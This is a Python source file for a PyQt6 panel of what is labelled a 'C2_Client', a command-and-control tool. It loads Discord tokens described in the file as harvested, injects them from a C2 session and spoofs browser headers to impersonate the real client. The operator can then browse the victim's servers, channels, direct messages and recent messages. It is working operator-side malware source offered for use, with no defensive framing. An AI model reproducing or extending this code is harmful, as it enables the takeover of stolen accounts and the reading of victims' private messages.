# C2_Client/ui/discord_pane.py
import requests
import base64
import json
import threading
from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, 
                             QPushButton, QLineEdit, QListWidget, QTextEdit, QLabel, QStackedWidget,
                             QListWidgetItem, QMessageBox, QSplitter)
from PyQt6.QtGui import QPixmap, QImage, QIcon, QColor, QBrush
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QSize

# --- Global Caches for Icons ---
# Caching icons prevents re-downloading them every time the UI is updated.
server_icon_cache = {}

class ApiWorker(QThread):
    """A worker thread to make API calls to Discord without freezing the UI."""
    finished = pyqtSignal(dict)
    
    def __init__(self, token, endpoint):
        super().__init__()
        self.token = token
        self.endpoint = endpoint
        # Standard browser User-Agent and X-Super-Properties to mimic a real client
        x_super_properties = base64.b64encode(json.dumps({ "os": "Windows", "browser": "Chrome", "os_version": "10", "release_channel": "stable"}, separators=(',', ':')).encode()).decode()
        self.headers = { 'Authorization': token, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'X-Super-Properties': x_super_properties }

    def run(self):
        try:
            with requests.Session() as s:
                s.headers.update(self.headers)
                url = f"https://discord.com/api/v9/{self.endpoint}"
                response = s.get(url, timeout=10)
                response.raise_for_status()
                self.finished.emit({"success": True, "data": response.json() if response.text else {}})
        except requests.exceptions.RequestException as e:
            self.finished.emit({"success": False, "error": str(e), "response_text": e.response.text if hasattr(e, 'response') else ''})

class DiscordPane(QWidget):
    def __init__(self):
        super().__init__()
        self.current_token = None
        self.worker_threads = [] # Keep track of threads to prevent premature garbage collection
        
        self.stack = QStackedWidget(self)
        layout = QVBoxLayout(self)
        layout.addWidget(self.stack)

        # --- Screen 1: Token Entry ---
        self.token_entry_screen = QWidget()
        token_layout = QVBoxLayout(self.token_entry_screen)
        token_layout.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.token_input = QLineEdit()
        self.token_input.setPlaceholderText("Harvested Discord Token will appear here...")
        self.token_input.setMinimumWidth(400)
        self.login_button = QPushButton("Load Token")
        self.login_button.clicked.connect(self.load_token)
        self.feedback_label = QLabel("")
        token_layout.addWidget(self.token_input)
        token_layout.addWidget(self.login_button)
        token_layout.addWidget(self.feedback_label)

        # --- Screen 2: Main Client View ---
        self.main_client_screen = QWidget()
        main_layout = QHBoxLayout(self.main_client_screen)
        main_layout.setContentsMargins(0,0,0,0)
        main_layout.setSpacing(0)
        
        self.server_list = QListWidget()
        self.server_list.setFixedWidth(70)
        self.server_list.setIconSize(QSize(50, 50))
        self.server_list.itemClicked.connect(self.handle_server_select)
        main_layout.addWidget(self.server_list)
        
        splitter = QSplitter(Qt.Orientation.Horizontal)
        main_layout.addWidget(splitter)
        
        # Channel Pane (left of messages)
        channel_pane = QWidget()
        channel_pane.setStyleSheet("background-color: #2f3136;")
        channel_layout = QVBoxLayout(channel_pane)
        channel_layout.setContentsMargins(0,0,0,0); channel_layout.setSpacing(0)
        self.server_name_label = QLabel("Select a Server")
        self.server_name_label.setStyleSheet("padding: 10px; font-weight: bold; border-bottom: 1px solid #202225;")
        channel_layout.addWidget(self.server_name_label)
        self.channel_list = QListWidget()
        self.channel_list.itemClicked.connect(self.handle_channel_select)
        channel_layout.addWidget(self.channel_list)
        
        # Chat Pane (messages and members)
        chat_pane = QWidget()
        chat_layout = QHBoxLayout(chat_pane)
        chat_layout.setContentsMargins(0,0,0,0); chat_layout.setSpacing(0)
        message_view_widget = QWidget()
        message_view_layout = QVBoxLayout(message_view_widget)
        self.message_view = QTextEdit()
        self.message_view.setReadOnly(True)
        message_view_layout.addWidget(self.message_view)
        
        chat_layout.addWidget(message_view_widget, 3) # Messages take 3/4 of the space
        self.member_list = QListWidget()
        self.member_list.setStyleSheet("background-color: #2f3136;")
        chat_layout.addWidget(self.member_list, 1) # Members take 1/4 of the space

        splitter.addWidget(channel_pane)
        splitter.addWidget(chat_pane)
        splitter.setSizes([240, 960]) # Initial sizing for channel and chat panes

        self.stack.addWidget(self.token_entry_screen)
        self.stack.addWidget(self.main_client_screen)
        self.stack.setCurrentWidget(self.token_entry_screen)

    def load_token_from_c2(self, token):
        """Public method to be called from session_view to inject a token."""
        if token:
            self.token_input.setText(token)
            self.load_token()

    def load_token(self):
        token = self.token_input.text().strip().replace('"', '')
        if not token:
            self.feedback_label.setText("Token cannot be empty.")
            return
        self.current_token = token
        self.feedback_label.setText("Connecting...")
        self.fetch_api_data('users/@me', self.handle_initial_user_load)

    def fetch_api_data(self, endpoint, callback_function):
        worker = ApiWorker(self.current_token, endpoint)
        worker.finished.connect(callback_function)
        self.worker_threads.append(worker)
        worker.start()

    def handle_initial_user_load(self, result):
        if result["success"]:
            self.feedback_label.setText(f"Successfully loaded token for: {result['data']['username']}")
            self.stack.setCurrentWidget(self.main_client_screen)
            self.fetch_api_data('users/@me/guilds', self.populate_servers)
        else:
            self.feedback_label.setText(f"<font color='red'>Error: Invalid Token or API failure.</font>")
            QMessageBox.critical(self, "Error", f"Failed to load token: {result['error']}\n\n{result.get('response_text')}")

    def populate_servers(self, result):
        self.server_list.clear()
        if not result["success"]:
            QMessageBox.critical(self, "Error", f"Failed to load servers: {result['error']}")
            return
        # Add a "Home" button
        dm_item = QListWidgetItem("Home"); dm_item.setData(Qt.ItemDataRole.UserRole, {"id": "home", "name": "Home / DMs"}); self.server_list.addItem(dm_item)
        for server in result["data"]:
            item = QListWidgetItem(server['name']); item.setData(Qt.ItemDataRole.UserRole, server)
            self.server_list.addItem(item)
            if server.get('icon'):
                # Use a thread to load icons in the background
                threading.Thread(target=self.load_icon, args=(f"https://cdn.discordapp.com/icons/{server['id']}/{server['icon']}.png", server['icon'], item), daemon=True).start()

    def load_icon(self, url, key, item):
        if key in server_icon_cache:
            item.setIcon(server_icon_cache[key]); return
        try:
            data = requests.get(url).content; pixmap = QPixmap(); pixmap.loadFromData(data)
            icon = QIcon(pixmap); server_icon_cache[key] = icon
            item.setIcon(icon) # This might need to be done in the main thread if issues arise
        except requests.RequestException:
            pass

    def handle_server_select(self, item):
        server_data = item.data(Qt.ItemDataRole.UserRole)
        self.server_name_label.setText(server_data.get('name'))
        self.channel_list.clear(); self.message_view.clear(); self.member_list.clear()
        
        if server_data.get('id') == "home":
            self.fetch_api_data('users/@me/channels', self.populate_dm_channels)
        else:
            self.fetch_api_data(f"guilds/{server_data['id']}/channels", self.populate_channels)

    def populate_dm_channels(self, result):
        if result["success"]:
            for dm in result["data"]:
                if dm['type'] in [1, 3]: # 1=DM, 3=Group DM
                    recipients = ", ".join([u['username'] for u in dm['recipients']])
                    item = QListWidgetItem(recipients); item.setData(Qt.ItemDataRole.UserRole, dm)
                    self.channel_list.addItem(item)

    def populate_channels(self, result):
        if result["success"]:
            channels = result["data"]
            categories = {c['id']: [] for c in channels if c['type'] == 4}
            # Group channels under their categories
            for channel in channels:
                if channel.get('parent_id') in categories:
                    categories[channel['parent_id']].append(channel)
            # Display categories and their channels in order
            for category in sorted([c for c in channels if c['type'] == 4], key=lambda x: x.get('position', 0)):
                cat_item = QListWidgetItem(category['name'].upper())
                cat_item.setFlags(Qt.ItemFlag.NoItemFlags); cat_item.setForeground(QColor("#96989d"))
                self.channel_list.addItem(cat_item)
                for channel in sorted(categories.get(category['id'], []), key=lambda x: x.get('position', 0)):
                    if channel['type'] == 0: # Text channel
                        item = QListWidgetItem(f"  # {channel['name']}")
                        item.setData(Qt.ItemDataRole.UserRole, channel)
                        self.channel_list.addItem(item)

    def handle_channel_select(self, item):
        channel_data = item.data(Qt.ItemDataRole.UserRole)
        if not channel_data or not channel_data.get('id'): return
        self.fetch_api_data(f"channels/{channel_data['id']}/messages?limit=50", self.populate_messages)

    def populate_messages(self, result):
        self.message_view.clear()
        if result["success"]:
            for message in reversed(result["data"]):
                author = message['author']['username']
                timestamp = message.get('timestamp', '')[:19].replace("T", " ")
                content = message['content']
                self.message_view.append(f"<b>[{timestamp}] {author}:</b> {content}")